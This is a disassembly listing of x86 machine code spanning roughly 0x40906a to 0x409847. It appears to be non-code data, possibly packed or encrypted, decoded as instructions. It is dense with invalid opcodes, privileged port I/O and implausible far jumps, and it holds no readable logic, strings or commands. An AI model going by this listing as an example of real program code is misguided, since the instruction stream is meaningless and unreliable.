  40906a:	add    al,BYTE PTR [edx]
  40906c:	inc    edx
  40906d:	pop    ebx
  40906e:	in     al,0x1d
  409070:	xor    edi,DWORD PTR [edi-0x7c]
  409073:	adc    DWORD PTR [ebp-0x2518c659],0x39eec1a0
  40907d:	lock pop eax
  40907f:	xor    DWORD PTR [eax],eax
  409081:	popf   
  409082:	ss mov ebp,0xbf8cca9f
  409088:	and    bh,bh
  40908a:	or     ebx,DWORD PTR [edi-0x20]
  40908d:	ja     0x4090fb
  40908f:	retf   0x3f70
  409092:	adc    al,BYTE PTR [ecx]
  409094:	aad    0x7c
  409096:	call   0xb2c59e48
  40909b:	sbb    DWORD PTR [edx+edx*1],ebx
  40909e:	adc    ecx,DWORD PTR [edx]
  4090a0:	out    dx,eax
  4090a1:	mov    edx,0x74a80108
  4090a6:	jb     0x4090ea
  4090a8:	fcom   st(6)
  4090aa:	ret    0xeca5
  4090ad:	fs jg  0x4090de
  4090b0:	mov    BYTE PTR [eax+0x14553242],0xaf
  4090b7:	nop
  4090b8:	lahf   
  4090b9:	adc    eax,0x1e56abc1
  4090be:	es ins DWORD PTR es:[edi],dx
  4090c0:	ja     0x40908f
  4090c2:	or     cl,0xa9
  4090c5:	or     al,0xb5
  4090c7:	and    DWORD PTR [edx],esi
  4090c9:	jle    0x409149
  4090cb:	mov    eax,ds:0x8739928f
  4090d0:	sub    al,0x24
  4090d2:	jb     0x4090d9
  4090d4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4090d5:	xchg   esp,eax
  4090d6:	fsubr  QWORD PTR [edx]
  4090d8:	cmp    DWORD PTR [esi+0x6],esp
  4090db:	push   cs
  4090dc:	push   ebp
  4090dd:	aam    0x7f
  4090df:	fsub   st,st(7)
  4090e1:	jp     0x4090fb
  4090e3:	test   al,0x24
  4090e5:	jp     0x40913f
  4090e7:	jge    0x4090c6
  4090e9:	jl     0x40915a
  4090eb:	jle    0x409102
  4090ed:	lock and eax,0x9ebdaf45
  4090f3:	bswap  esi
  4090f5:	add    ah,dh
  4090f7:	stos   DWORD PTR es:[edi],eax
  4090f8:	xor    DWORD PTR [eax+0x35],esp
  4090fb:	dec    edx
  4090fc:	dec    ebx
  4090fd:	sub    al,0xed
  4090ff:	mov    ah,0xb4
  409101:	fstp   DWORD PTR [eax-0x2a9894d3]
  409107:	jle    0x409112
  409109:	daa    
  40910a:	xchg   esi,esi
  40910c:	ja     0x4090ee
  40910e:	paddsb mm7,QWORD PTR [edx]
  409111:	mov    dl,0x8b
  409113:	shl    DWORD PTR [edx+0x214c5518],cl
  409119:	mov    DWORD PTR [esi+0x37e667dd],0x864b9ecf
  409123:	outs   dx,DWORD PTR ds:[esi]
  409124:	inc    esp
  409125:	bound  ebx,QWORD PTR [edx]
  409127:	mov    ds:0xaac04945,al
  40912c:	add    ecx,ecx
  40912e:	out    dx,al
  40912f:	sti    
  409130:	jno    0x409189
  409132:	lods   al,BYTE PTR ds:[esi]
  409133:	mov    esi,DWORD PTR [edi-0x12eb8156]
  409139:	sbb    eax,0x2fc0f51d
  40913e:	jmp    0x4091b3
  409140:	mov    ah,0x98
  409142:	ja     0x409134
  409144:	mov    ch,0x19
  409146:	arpl   bp,bp
  409148:	add    DWORD PTR [ebp+edi*1-0xde507e6],edx
  40914f:	jle    0x4090fc
  409151:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409152:	ins    BYTE PTR es:[edi],dx
  409153:	mov    DWORD PTR [ecx-0x55],edx
  409156:	int    0xe
  409158:	pushf  
  409159:	imul   esp,DWORD PTR [edi+0x2],0xc964ef9b
  409160:	pusha  
  409161:	adc    al,bl
  409163:	icebp  
  409164:	pop    ss
  409165:	out    0xd3,al
  409167:	js     0x40919e
  409169:	in     eax,dx
  40916a:	xchg   ecx,eax
  40916b:	xchg   ecx,eax
  40916c:	enter  0xde37,0x40
  409170:	clc    
  409171:	jno    0x4091e1
  409173:	push   eax
  409174:	inc    edx
  409175:	pop    es
  409176:	inc    esp
  409177:	lods   al,BYTE PTR ds:[esi]
  409178:	or     esp,DWORD PTR [ecx+edx*2]
  40917b:	pop    edi
  40917c:	dec    ecx
  40917d:	inc    edx
  40917e:	rol    DWORD PTR [eax-0xd64dff],1
  409184:	pusha  
  409185:	out    0xc5,eax
  409187:	loopne 0x409148
  409189:	mov    bh,cl
  40918b:	or     DWORD PTR [eax],esi
  40918d:	pushf  
  40918e:	neg    DWORD PTR [edx-0x42f492f9]
  409194:	rep stos DWORD PTR es:[edi],eax
  409196:	xchg   BYTE PTR [ebx],dl
  409198:	and    eax,0xbc4b8e07
  40919d:	js     0x40917f
  40919f:	and    DWORD PTR [esi+0x58],esp
  4091a2:	mov    edi,0xec32613f
  4091a7:	popf   
  4091a8:	dec    ebx
  4091a9:	pop    esi
  4091aa:	je     0x4091b8
  4091ac:	dec    edx
  4091ad:	mov    ebp,0x6d2663b
  4091b2:	mov    ah,0x19
  4091b4:	(bad)  
  4091b6:	xchg   ecx,eax
  4091b7:	lock xchg ah,dl
  4091ba:	pop    esi
  4091bb:	push   ebp
  4091bc:	pop    ecx
  4091bd:	push   0x17
  4091bf:	jle    0x4091f8
  4091c1:	mov    dh,0x79
  4091c3:	and    al,0xc9
  4091c5:	inc    ecx
  4091c6:	fiadd  WORD PTR [ebx+0x28a5e044]
  4091cc:	stos   DWORD PTR es:[edi],eax
  4091cd:	mov    ebp,0xf53dfb66
  4091d2:	adc    BYTE PTR [eax+0xd5e2617],bh
  4091d8:	xchg   ebp,eax
  4091d9:	in     al,dx
  4091da:	mov    ebx,0x69ba39ea
  4091df:	inc    edi
  4091e0:	leave  
  4091e1:	mov    al,cl
  4091e3:	push   0x77
  4091e5:	rcr    DWORD PTR [edx],1
  4091e7:	fucomp st(6)
  4091e9:	inc    edi
  4091ea:	mov    dl,0x61
  4091ec:	dec    edx
  4091ed:	sub    DWORD PTR [edi+0x24],0x6e
  4091f1:	out    dx,eax
  4091f2:	scas   al,BYTE PTR es:[edi]
  4091f3:	ja     0x409185
  4091f5:	mov    WORD PTR [edi+0x1d],cs
  4091f8:	stos   DWORD PTR es:[edi],eax
  4091f9:	and    cl,BYTE PTR [ebp-0x2b388613]
  4091ff:	cmc    
  409200:	and    edi,DWORD PTR [eax-0x63805735]
  409206:	inc    edx
  409207:	sub    al,0x1f
  409209:	or     BYTE PTR [eax-0x7c],dh
  40920c:	in     eax,0x4c
  40920e:	cmp    eax,0xf73917f9
  409213:	pop    esi
  409214:	les    esi,FWORD PTR [edx+0x17]
  409217:	nop
  409218:	or     DWORD PTR [ecx+0x555bbc1f],eax
  40921e:	fiadd  DWORD PTR [edx]
  409220:	jno    0x40928f
  409222:	out    0x89,eax
  409224:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409225:	lods   eax,DWORD PTR ds:[esi]
  409226:	mov    ah,0x8e
  409228:	pop    edx
  409229:	and    edx,DWORD PTR [ebx-0x47]
  40922c:	cld    
  40922d:	xchg   BYTE PTR [edx],cl
  40922f:	lea    esi,ds:0xb2616eb3
  409235:	popf   
  409236:	add    cl,ah
  409238:	pop    esi
  409239:	sub    BYTE PTR [edx+0x1e4e016c],ah
  40923f:	cli    
  409240:	mov    bl,0xda
  409242:	sub    eax,0x32c98442
  409247:	jae    0x409286
  409249:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40924a:	adc    esi,DWORD PTR [ebx-0x66475175]
  409250:	shl    DWORD PTR [ecx+0x3],0x46
  409254:	xor    ecx,DWORD PTR [ebp-0x2b]
  409257:	sbb    DWORD PTR [edx],eax
  409259:	sar    ecx,cl
  40925b:	popf   
  40925c:	sub    dl,bl
  40925e:	dec    ebx
  40925f:	jle    0x4092d8
  409261:	jmp    0x97c9c808
  409266:	clc    
  409267:	cwde   
  409268:	fiadd  DWORD PTR [edx]
  40926a:	retf   
  40926b:	mov    ebp,0x2f0be5f
  409270:	cmp    eax,DWORD PTR ds:0x42bee15a
  409276:	xor    al,0x50
  409278:	(bad)  
  409279:	daa    
  40927a:	mov    cl,0x6d
  40927c:	or     BYTE PTR [edx-0x23],bh
  40927f:	pop    eax
  409280:	(bad)  
  409281:	xor    cl,BYTE PTR [edx]
  409283:	xchg   esi,eax
  409284:	mov    ecx,DWORD PTR [edx-0x5e]
  409287:	(bad)  
  409288:	cli    
  409289:	adc    DWORD PTR [edx-0x72],0x1a
  40928d:	xchg   edi,eax
  40928e:	inc    esp
  40928f:	jp     0x4092fb
  409291:	mov    bh,0xa
  409293:	addr16 lahf 
  409295:	push   edi
  409296:	add    BYTE PTR [ebp+eiz*1+0xa],ah
  40929a:	cmp    BYTE PTR [ecx+edx*4],0xab
  40929e:	sub    edx,DWORD PTR [esi]
  4092a0:	xchg   ecx,eax
  4092a1:	sbb    ebp,DWORD PTR [ebp+0x329a3553]
  4092a7:	clc    
  4092a8:	outs   dx,BYTE PTR ds:[esi]
  4092a9:	add    eax,0x221806f8
  4092ae:	pop    edi
  4092af:	mov    ch,ch
  4092b1:	inc    esp
  4092b2:	inc    ebx
  4092b3:	fsubr  DWORD PTR [ebp+0x1fae4eb1]
  4092b9:	jl     0x4092ff
  4092bb:	xchg   esi,eax
  4092bc:	imul   esi,esp,0xadb38ce5
  4092c2:	mov    cl,0x3a
  4092c4:	sbb    edx,eax
  4092c6:	int    0xb1
  4092c8:	push   ebp
  4092c9:	arpl   WORD PTR [edi+esi*8],di
  4092cc:	inc    ebp
  4092cd:	jg     0x409325
  4092cf:	out    0x1a,al
  4092d1:	and    edx,eax
  4092d3:	pop    ds
  4092d4:	stos   BYTE PTR es:[edi],al
  4092d5:	jnp    0x409271
  4092d7:	cs push ss
  4092d9:	fild   QWORD PTR [ebx-0x47d48095]
  4092df:	sbb    al,0x68
  4092e1:	stos   DWORD PTR es:[edi],eax
  4092e2:	mov    ch,0xe1
  4092e4:	dec    ebp
  4092e5:	xor    al,0x69
  4092e7:	addr16 mov esp,0xf3ca54d9
  4092ed:	mov    cl,0xfd
  4092ef:	cmp    DWORD PTR [ebp-0x68cfa7b0],edx
  4092f5:	jns    0x4092b6
  4092f7:	into   
  4092f8:	pop    ebp
  4092f9:	stos   BYTE PTR es:[edi],al
  4092fa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4092fb:	sbb    eax,0xc65febea
  409300:	xor    DWORD PTR [ecx+0x4c],0xee40a7b
  409307:	imul   esi,ebp,0xf37e3a09
  40930d:	sbb    DWORD PTR [ebx+0x3],edx
  409310:	xchg   ebp,eax
  409311:	push   cs
  409312:	mov    esi,edx
  409314:	outs   dx,DWORD PTR ds:[esi]
  409315:	xor    ch,BYTE PTR [edi+0x195de2c4]
  40931b:	jo     0x409372
  40931d:	mov    dl,0xa0
  40931f:	push   ss
  409320:	ret    
  409321:	push   es
  409322:	addr16 aam 0xa1
  409325:	push   es
  409326:	into   
  409327:	arpl   WORD PTR [eax],bp
  409329:	rcr    ebp,cl
  40932b:	adc    al,0x95
  40932d:	les    ebp,FWORD PTR [edx-0x62]
  409330:	xor    edi,DWORD PTR [edx+ebp*1]
  409333:	mov    ah,0xe4
  409335:	ret    0x5583
  409338:	xchg   edx,eax
  409339:	call   0xc6915be0
  40933e:	jb     0x4092e0
  409340:	xchg   ebx,eax
  409341:	fs xchg esi,eax
  409343:	imul   ebx,ecx,0xff690c46
  409349:	aaa    
  40934a:	neg    DWORD PTR [edx-0x704518cd]
  409350:	sub    cl,dh
  409352:	neg    ebx
  409354:	test   DWORD PTR [edx],eax
  409356:	in     eax,dx
  409357:	aad    0x62
  409359:	xchg   ebp,eax
  40935a:	popf   
  40935b:	add    BYTE PTR [eax-0x64],0x91
  40935f:	cdq    
  409360:	test   DWORD PTR ds:0x8ea3194d,esi
  409366:	(bad)  
  409367:	fidiv  DWORD PTR [esi-0x7e]
  40936a:	out    dx,al
  40936b:	sub    dh,BYTE PTR [eax]
  40936d:	icebp  
  40936e:	loope  0x409347
  409370:	sbb    eax,0xb2b1c3c0
  409375:	sti    
  409376:	push   ecx
  409377:	retf   
  409378:	mov    ds:0xcabf8878,eax
  40937d:	cmp    BYTE PTR [edi-0x51],0x5f
  409381:	cmp    eax,0x56f68014
  409386:	adc    eax,0xfdacc4b8
  40938b:	mov    al,0x2b
  40938d:	sbb    dl,al
  40938f:	aas    
  409390:	ss pusha 
  409392:	cld    
  409393:	inc    eax
  409394:	repnz push 0x78159370
  40939a:	leave  
  40939b:	cdq    
  40939c:	dec    eax
  40939d:	xor    al,bl
  40939f:	call   0xe6f1:0x99417936
  4093a6:	xchg   DWORD PTR [edi],ebp
  4093a8:	push   0xdaf22549
  4093ad:	shr    dh,cl
  4093af:	cmp    eax,0x8fd394e6
  4093b4:	test   eax,0xcf7b22e7
  4093b9:	int3   
  4093ba:	bound  edi,QWORD PTR [ebx]
  4093bc:	xor    esp,DWORD PTR [ebp+ebp*8+0x451c1e53]
  4093c3:	mov    dl,0xc3
  4093c5:	sbb    ebp,ebp
  4093c7:	mov    es,WORD PTR [edi-0x720f33e]
  4093cd:	or     ecx,ecx
  4093cf:	retf   0xc154
  4093d2:	pop    ss
  4093d3:	xchg   ebx,eax
  4093d4:	cld    
  4093d5:	cmc    
  4093d6:	out    dx,eax
  4093d7:	ja     0x4093ca
  4093d9:	xor    al,BYTE PTR [ebp+0x44e2ef87]
  4093df:	test   DWORD PTR [edx],ebp
  4093e1:	mov    cl,0x46
  4093e3:	iret   
  4093e4:	and    esp,DWORD PTR [esi]
  4093e6:	sub    ecx,DWORD PTR [edx+0x6d]
  4093e9:	mov    BYTE PTR [eax+0x61],ah
  4093ec:	xchg   ebx,eax
  4093ed:	sub    al,0x52
  4093ef:	jl     0x4093a5
  4093f1:	mov    cl,0x28
  4093f3:	mov    dh,0x8d
  4093f5:	cs push eax
  4093f7:	dec    ebx
  4093f8:	sbb    cl,BYTE PTR [edx+ecx*8]
  4093fb:	sub    al,0xe4
  4093fd:	es fwait
  4093ff:	retf   
  409400:	mov    DWORD PTR [edi-0x4401946c],edx
  409406:	sbb    al,0x63
  409408:	(bad)  
  40940a:	jno    0x40942b
  40940c:	mov    ds:0x30c0a43b,eax
  409411:	cli    
  409412:	push   edi
  409413:	retf   
  409414:	mov    al,0x9c
  409416:	push   ebp
  409417:	addr16 jmp 0x307f:0xd079164b
  40941f:	int    0xc1
  409421:	sbb    dl,BYTE PTR [ecx-0x4d7a3411]
  409427:	jns    0x4093e1
  409429:	rol    eax,cl
  40942b:	cwde   
  40942c:	xor    BYTE PTR [ebx+ebp*4],0xf
  409430:	sahf   
  409431:	call   0x1553:0x76fd033f
  409438:	xor    BYTE PTR [ebx+0x66],0x6b
  40943c:	inc    edx
  40943d:	je     0x409406
  40943f:	sub    al,0x4b
  409441:	mov    esp,0xa8caf93c
  409446:	mov    ebx,0xc789058f
  40944b:	sbb    BYTE PTR [ebp+0x1003775d],ah
  409451:	ret    0xaad7
  409454:	ret    0x1f94
  409457:	and    eax,DWORD PTR [ecx+0x5d]
  40945a:	jmp    0x4094c6
  40945c:	jmp    0x4094d5
  40945e:	and    edx,eax
  409460:	adc    DWORD PTR [ebx-0x7d],0x30
  409464:	gs push ds
  409466:	fnstenv [ecx-0x22]
  409469:	aad    0x2b
  40946b:	nop
  40946c:	test   al,0xbb
  40946e:	popf   
  40946f:	fnstcw WORD PTR [esi+0x25df27a5]
  409475:	mov    ds:0x9f7cb76c,al
  40947a:	repz cmp edi,eax
  40947d:	daa    
  40947e:	lahf   
  40947f:	(bad)  
  409481:	test   al,0x20
  409483:	cmp    dl,bh
  409485:	add    DWORD PTR [ebx+0x63],edx
  409488:	mov    BYTE PTR ds:0xf4be1847,ah
  40948e:	jo     0x409425
  409490:	pop    ebp
  409491:	aad    0xc5
  409493:	xor    al,0x9
  409495:	mov    ch,0xda
  409497:	lahf   
  409498:	xchg   DWORD PTR [esi-0x44],esi
  40949b:	xor    eax,0x364eb777
  4094a0:	cwde   
  4094a1:	mov    ebx,0x39e1f343
  4094a6:	mov    ds:0x90f631f5,al
  4094ab:	mov    dl,0x87
  4094ad:	fnstsw WORD PTR [eax]
  4094af:	push   ebp
  4094b0:	fst    st(7)
  4094b2:	aam    0xe5
  4094b4:	in     al,dx
  4094b5:	aad    0x6c
  4094b7:	mov    al,ds:0x5fd2cde5
  4094bc:	cmp    BYTE PTR [esi+0x3c0dd667],0xbe
  4094c3:	sub    al,0x9b
  4094c5:	pop    esp
  4094c6:	imul   edx,DWORD PTR [ebp+0x2a58f8ba],0xffffffb3
  4094cd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4094ce:	jge    0x40950d
  4094d0:	stos   BYTE PTR es:[edi],al
  4094d1:	enter  0xf78,0xae
  4094d5:	stos   DWORD PTR es:[edi],eax
  4094d6:	push   ecx
  4094d7:	es and eax,0x4af5e398
  4094dd:	stos   BYTE PTR es:[edi],al
  4094de:	cmc    
  4094df:	inc    esp
  4094e0:	mov    esp,0xde10049f
  4094e5:	and    DWORD PTR [ecx-0x55e21fc],esp
  4094eb:	fmul   st,st(5)
  4094ed:	mov    ebx,0x78bbd5e3
  4094f2:	pop    ebx
  4094f3:	fdivrp st(4),st
  4094f5:	das    
  4094f6:	es test DWORD PTR es:[ecx+eax*4+0x25c334bb],esp
  4094ff:	xor    eax,0xba927762
  409504:	ds or  eax,0x457c7734
  40950a:	xchg   edx,eax
  40950c:	out    0xc4,eax
  40950e:	adc    ebp,DWORD PTR [edx+0x4c]
  409511:	stc    
  409512:	lods   al,BYTE PTR ds:[esi]
  409513:	push   ss
  409514:	sub    al,0x3
  409516:	cs scas al,BYTE PTR es:[edi]
  409518:	leave  
  409519:	inc    edi
  40951a:	or     dl,BYTE PTR [eax+0x25]
  40951d:	push   0x5
  40951f:	mov    al,ds:0x5ec05c71
  409524:	in     eax,dx
  409525:	sar    BYTE PTR ds:0x2efe0c2e,1
  40952b:	arpl   WORD PTR [esp+edi*4-0x7b],cx
  40952f:	repz adc eax,0x3c4b282a
  409535:	pushf  
  409536:	in     al,0x70
  409538:	in     eax,dx
  409539:	inc    edx
  40953a:	enter  0x3373,0x56
  40953e:	add    DWORD PTR [eax-0x57944233],esi
  409544:	scas   eax,DWORD PTR es:[edi]
  409545:	jo     0x40959c
  409547:	stc    
  409548:	mov    DWORD PTR [esi],ebp
  40954a:	stos   DWORD PTR es:[edi],eax
  40954b:	enter  0xf414,0x22
  40954f:	popa   
  409550:	ret    0xacd2
  409553:	push   0x58
  409555:	js     0x4094d7
  409557:	mov    dl,al
  409559:	dec    edx
  40955a:	out    0x2,eax
  40955c:	mov    WORD PTR [edi+0x5fd2768a],?
  409562:	xchg   ebp,eax
  409563:	mov    ds:0x619227a7,eax
  409568:	or     ch,BYTE PTR [ebx+0x2e]
  40956b:	jb     0x4095e4
  40956d:	cmp    DWORD PTR [edx-0x31],edx
  409570:	int3   
  409571:	or     eax,0x46148915
  409576:	cmp    BYTE PTR [edi+0xd160234],ch
  40957c:	aas    
  40957d:	jmp    0x42ac:0xdfab28e
  409584:	inc    esi
  409585:	sti    
  409586:	cmp    DWORD PTR [esi+0x35c6e6c1],esp
  40958c:	popf   
  40958d:	bound  esi,QWORD PTR [edx]
  40958f:	in     eax,0xda
  409591:	mov    DWORD PTR [esi+0x288ac72c],edi
  409597:	sbb    eax,0x73f736fb
  40959c:	cdq    
  40959d:	push   ecx
  40959e:	pushf  
  40959f:	or     al,0x69
  4095a1:	mov    esp,0x41384451
  4095a6:	add    al,0x2f
  4095a8:	aad    0xe
  4095aa:	pushf  
  4095ab:	pushf  
  4095ac:	mov    ds:0x20924b34,al
  4095b1:	xor    ebp,ebp
  4095b3:	push   esp
  4095b4:	lahf   
  4095b5:	sbb    esp,0x4fe5a02d
  4095bb:	push   ds
  4095bc:	add    dl,BYTE PTR [edx-0x63]
  4095bf:	push   esi
  4095c0:	inc    ecx
  4095c1:	pop    esp
  4095c2:	out    dx,al
  4095c3:	std    
  4095c4:	repz int3 
  4095c6:	repnz mov bh,BYTE PTR [esi-0x59]
  4095ca:	mov    fs,WORD PTR [esi-0x2f]
  4095cd:	jge    0x40959c
  4095cf:	(bad)  
  4095d0:	cmp    BYTE PTR [ecx],bl
  4095d2:	xchg   esp,eax
  4095d3:	arpl   WORD PTR [edi-0x7],ax
  4095d6:	cmp    cl,dl
  4095d8:	sbb    eax,0xdec71bb2
  4095dd:	frstor [ecx+edx*8+0x10c51bd9]
  4095e4:	and    eax,0xbbd4fd71
  4095e9:	add    ah,BYTE PTR [ebx+eax*8-0x27]
  4095ed:	in     eax,dx
  4095ee:	add    DWORD PTR [edx-0x4e5663cc],ecx
  4095f4:	and    bl,BYTE PTR ds:0x7ac691d1
  4095fa:	fld    DWORD PTR [ebx]
  4095fc:	mov    ebx,0xd381e35b
  409601:	mov    esp,0x9d74fd81
  409606:	pop    ebp
  409607:	wbinvd 
  409609:	dec    ecx
  40960a:	imul   esp,DWORD PTR [edx],0xffffffd8
  40960d:	dec    esp
  40960e:	mov    al,0x6
  409610:	mov    edi,0xa856bb89
  409615:	inc    edi
  409616:	rcl    DWORD PTR [ebx-0x2af44b3],0xf7
  40961d:	sub    ecx,ebx
  40961f:	lods   eax,DWORD PTR ds:[esi]
  409620:	popf   
  409621:	mov    cl,0xd4
  409623:	fdivr  QWORD PTR [edi+0x5211592]
  409629:	std    
  40962a:	add    eax,DWORD PTR [esi-0x72]
  40962d:	fstp   DWORD PTR [esi]
  40962f:	sbb    al,0xb9
  409631:	scas   eax,DWORD PTR es:[edi]
  409632:	jp     0x40964f
  409634:	sbb    al,0x17
  409636:	inc    edi
  409637:	mov    ebx,0xbc57444a
  40963c:	lods   eax,DWORD PTR ds:[esi]
  40963d:	(bad)  
  40963e:	lds    eax,FWORD PTR [ebx-0x23]
  409641:	inc    ebx
  409642:	mov    esp,0x92ac154e
  409647:	rcl    al,cl
  409649:	inc    ecx
  40964a:	aas    
  40964b:	and    BYTE PTR [esi+0x7a025282],0xa7
  409652:	sub    eax,0xe4ad3ee9
  409657:	out    dx,al
  409658:	pop    ss
  409659:	outs   dx,DWORD PTR ds:[esi]
  40965a:	mov    eax,ds:0xa8cea8e5
  40965f:	out    0x1e,al
  409661:	mov    ds:0xc0556b4f,eax
  409666:	stos   DWORD PTR es:[edi],eax
  409667:	(bad)  
  409668:	cmp    eax,0x8faecb60
  40966d:	cmp    esi,DWORD PTR [eax+0x60b0888d]
  409673:	lods   al,BYTE PTR ds:[esi]
  409674:	dec    ebx
  409675:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409676:	inc    esp
  409677:	in     al,dx
  409678:	push   cs
  409679:	jmp    0x409611
  40967b:	and    BYTE PTR [edi+0xb],0x51
  40967f:	dec    esp
  409680:	push   esi
  409681:	adc    al,BYTE PTR [edx]
  409683:	push   es
  409684:	and    BYTE PTR [eax],bl
  409686:	cmp    dl,BYTE PTR [edx+0x36]
  409689:	mov    WORD PTR [ecx+0x55],es
  40968c:	sahf   
  40968d:	inc    esi
  40968e:	ins    BYTE PTR es:[edi],dx
  40968f:	mov    cl,0x39
  409691:	aad    0x36
  409693:	out    dx,al
  409694:	pop    ebx
  409695:	mov    esi,0x738c68ff
  40969a:	lds    ecx,FWORD PTR [eax-0x2c]
  40969d:	or     eax,0x9fe5154
  4096a2:	jnp    0x40967f
  4096a4:	xchg   edx,eax
  4096a5:	(bad)  
  4096a6:	mov    ebx,0x6818a144
  4096ab:	packssdw mm4,QWORD PTR [esp+eax*4-0x30c7c7fb]
  4096b3:	ins    BYTE PTR es:[edi],dx
  4096b4:	sti    
  4096b5:	and    dl,BYTE PTR [eax+0x2f]
  4096b8:	call   0xf7b5db28
  4096bd:	xor    al,0x2c
  4096bf:	rcr    BYTE PTR [edi+0x9d882b7],1
  4096c5:	les    ebp,FWORD PTR [esi+ebp*8-0x641d6288]
  4096cc:	repnz out 0x4e,al
  4096cf:	push   ebp
  4096d0:	jg     0x409731
  4096d2:	or     bl,BYTE PTR [ebp-0x4d]
  4096d5:	nop
  4096d6:	lahf   
  4096d7:	cmp    eax,0x971e1b49
  4096dc:	inc    edx
  4096dd:	sub    DWORD PTR [edi],esi
  4096df:	push   esp
  4096e0:	sbb    DWORD PTR [esi-0x2885d97c],esp
  4096e6:	inc    edi
  4096e7:	leave  
  4096e8:	jnp    0x4096ca
  4096ea:	dec    ecx
  4096eb:	add    al,0xe8
  4096ed:	cli    
  4096ee:	sub    al,BYTE PTR [ebx+0x17]
  4096f1:	cld    
  4096f2:	in     eax,dx
  4096f3:	push   0x6eb1137f
  4096f8:	xlat   BYTE PTR ds:[ebx]
  4096f9:	sub    BYTE PTR [ecx+0x20],0x7d
  4096fd:	lock ja 0x4096d5
  409700:	shr    DWORD PTR [esi-0x74],cl
  409703:	out    0x9b,al
  409705:	cmp    BYTE PTR [eax-0x65],ch
  409708:	or     BYTE PTR [esi-0x35],al
  40970b:	or     bh,BYTE PTR [esi-0x32fbddb5]
  409711:	mov    ebp,0x2e8b4c13
  409716:	mov    BYTE PTR [ebp+0x58dac806],dh
  40971c:	fwait
  40971d:	inc    ebp
  40971e:	out    0x2c,eax
  409720:	jno    0x4096dc
  409722:	jmp    0x9fd3:0x7d216549
  409729:	xchg   ebp,eax
  40972a:	icebp  
  40972b:	inc    ebx
  40972c:	mov    ecx,0x4cf38c7e
  409731:	daa    
  409732:	int3   
  409733:	call   0xfa60:0xc957bd60
  40973a:	cmp    al,0x86
  40973c:	xchg   ebx,eax
  40973d:	jnp    0x40971a
  40973f:	xchg   esp,eax
  409740:	jl     0x409762
  409742:	test   DWORD PTR [ecx],esp
  409744:	add    bh,BYTE PTR ds:0xeaef72e2
  40974a:	mul    DWORD PTR ds:0xdb0af2b
  409750:	mov    ah,0x3d
  409752:	leave  
  409753:	scas   eax,DWORD PTR es:[edi]
  409754:	pop    esp
  409755:	cli    
  409756:	stos   BYTE PTR es:[edi],al
  409757:	jecxz  0x40977c
  409759:	or     ch,dh
  40975b:	out    0xa6,eax
  40975d:	sub    cl,0xa0
  409760:	into   
  409761:	gs xor al,dl
  409764:	and    al,0x7d
  409766:	mov    ds:0xd396d36c,eax
  40976b:	xchg   esp,eax
  40976c:	inc    eax
  40976d:	mov    ecx,0x59377cc5
  409772:	sub    cl,BYTE PTR [ebx+eax*4]
  409775:	fmul   st,st(6)
  409777:	dec    edx
  409778:	cmp    ebx,DWORD PTR [ebp-0x7dc176b5]
  40977e:	add    cl,ah
  409780:	adc    edx,ebx
  409782:	inc    eax
  409783:	push   ebx
  409784:	and    DWORD PTR [ecx+0x75],esp
  409787:	stos   BYTE PTR es:[edi],al
  409788:	fild   QWORD PTR [esi+0x1b]
  40978b:	fisub  DWORD PTR [edi-0x710a4e3d]
  409791:	pop    ds
  409792:	icebp  
  409793:	sub    dl,al
  409795:	push   edi
  409796:	(bad)  
  409797:	cmp    esi,DWORD PTR [eax-0x4628b36]
  40979d:	in     eax,0xca
  40979f:	add    DWORD PTR [esi],ebp
  4097a1:	mov    eax,ds:0x9f90e1fb
  4097a6:	repnz cmp eax,0xbaa20ea7
  4097ac:	aad    0x61
  4097ae:	cmc    
  4097af:	cmc    
  4097b0:	pushf  
  4097b1:	iret   
  4097b2:	fwait
  4097b3:	fwait
  4097b4:	push   cs
  4097b5:	aad    0x31
  4097b7:	sbb    DWORD PTR [ebx],esi
  4097b9:	sub    bl,al
  4097bb:	test   DWORD PTR [edi-0xf33a5e0],ebp
  4097c1:	dec    ecx
  4097c2:	mov    bh,0xda
  4097c4:	xor    bl,bl
  4097c6:	sub    dh,BYTE PTR [esi+0x1c]
  4097c9:	sub    esp,DWORD PTR [esi+0x782c8f89]
  4097cf:	dec    esp
  4097d0:	mov    cl,0xe8
  4097d2:	add    eax,0xf5ab39fb
  4097d7:	xchg   edi,eax
  4097d8:	push   esi
  4097d9:	adc    eax,0xe7aa0933
  4097de:	xchg   esi,eax
  4097df:	inc    ebx
  4097e0:	push   ebp
  4097e1:	mov    esp,ecx
  4097e3:	sbb    al,0x69
  4097e5:	mov    ebp,DWORD PTR [ebp+0x3e37124a]
  4097eb:	push   ss
  4097ec:	xor    al,0xa3
  4097ee:	iret   
  4097ef:	xor    bh,BYTE PTR [ebx-0x79]
  4097f2:	sbb    eax,DWORD PTR [eax+esi*1]
  4097f5:	dec    eax
  4097f6:	repz fwait
  4097f8:	xor    ebp,DWORD PTR [ebx-0x72]
  4097fb:	in     eax,dx
  4097fc:	pop    esi
  4097fd:	inc    edx
  4097fe:	xchg   edi,eax
  4097ff:	fwait
  409800:	pop    es
  409801:	rol    DWORD PTR [esi+0x16],0x56
  409805:	retf   
  409806:	jp     0x40987d
  409808:	aam    0x33
  40980a:	das    
  40980b:	push   ss
  40980c:	test   BYTE PTR [esi],ch
  40980e:	push   ds
  40980f:	jo     0x409796
  409811:	call   FWORD PTR [esi+eax*8]
  409814:	cwde   
  409815:	mov    BYTE PTR [edx],0x13
  409818:	or     DWORD PTR [esi+0xd],edx
  40981b:	cmp    DWORD PTR [esi],edi
  40981d:	xchg   ebp,eax
  40981e:	push   esp
  40981f:	dec    esi
  409820:	or     al,0x26
  409822:	inc    eax
  409823:	stos   DWORD PTR es:[edi],eax
  409824:	into   
  409825:	dec    ebp
  409826:	arpl   si,sp
  409828:	xchg   ebx,eax
  409829:	bound  ebx,QWORD PTR [ecx]
  40982b:	pop    edx
  40982c:	pusha  
  40982d:	pop    ds
  40982e:	push   edx
  40982f:	mov    ebp,0x7e9e70ec
  409834:	fwait
  409835:	out    0xe8,al
  409837:	mov    ds:0x66bf6d0c,eax
  40983c:	xor    dh,dh
  40983e:	push   ecx
  40983f:	ja     0x409868
  409841:	xchg   DWORD PTR [edi-0x688dfb2b],edi
  409847:	(bad)  
